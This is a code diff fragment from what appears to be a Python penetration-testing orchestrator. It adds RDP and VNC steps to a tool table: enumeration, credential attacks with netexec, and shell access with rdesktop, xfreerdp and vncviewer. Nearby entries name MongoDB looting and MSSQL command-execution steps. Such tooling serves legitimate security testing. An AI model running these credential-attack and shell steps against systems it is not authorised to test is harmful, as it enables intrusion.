     "mongo-loot":       ("Python (BSON wire)", f"{_mins(_MONGO_LOOT_DEADLINE)} min"),
     "mongo-next":       ("reference · no scan", None),
+    "rdp-enum":         ("Python (X.224) + netexec + nmap", None),
+    "rdp-creds":        ("netexec rdp", f"{_mins(_RDPCREDS_DEADLINE)} min"),
+    "rdp-shell":        ("rdesktop / xfreerdp", None),
+    "rdp-next":         ("reference · no scan", None),
+    "vnc-enum":         ("Python (RFB) + netexec", None),
+    "vnc-creds":        ("netexec vnc", None),
+    "vnc-shell":        ("vncviewer", None),
+    "vnc-next":         ("reference · no scan", None),
     "mssql-banner":     ("Python (stdlib) + searchsploit", None),
     "mssql-creds":      ("netexec mssql", f"{_mins(_MSSQLCREDS_DEADLINE)} min"),
     "mssql-exec":       ("netexec mssql -x", None),
@@ -17234,7 +17787,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         return
     tlabel, runner = _STEP_TOOLS[tool_key]
 
-    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "oracle-next", "mssql-next", "ssh-next", "ldap-next", "krb-next", "redis-next", "mongo-next"):  # foreground: interactive / print-now
+    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "oracle-next", "mssql-next", "ssh-next", "ldap-next", "krb-next", "redis-next", "mongo-next", "rdp-next", "vnc-next"):  # foreground: interactive / print-now
         prev = fetch_step_status(ip, port, proto, key).get(n)
         set_step_status(ip, port, proto, key, n, "running")
         try:
@@ -17243,7 +17796,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
             print(f"{RED}✗ {tool_key} error: {exc}{RESET}")
             set_step_status(ip, port, proto, key, n, prev)
             return
-        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "oracle-next", "mssql-next", "ssh-next", "ldap-next", "krb-next", "redis-next", "mongo-next"):  # a list to read now, not a scan result
+        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "oracle-next", "mssql-next", "ssh-next", "ldap-next", "krb-next", "redis-next", "mongo-next", "rdp-next", "vnc-next"):  # a list to read now, not a scan result
             print("\n" + out)
             out = re.sub(r"\x1b\[[0-9;]*m", "", out)           # store clean text (no ANSI) in DETAILS
         save_scripts(ip, [{"id": tool_key, "port": port, "proto": proto, "output": out}])
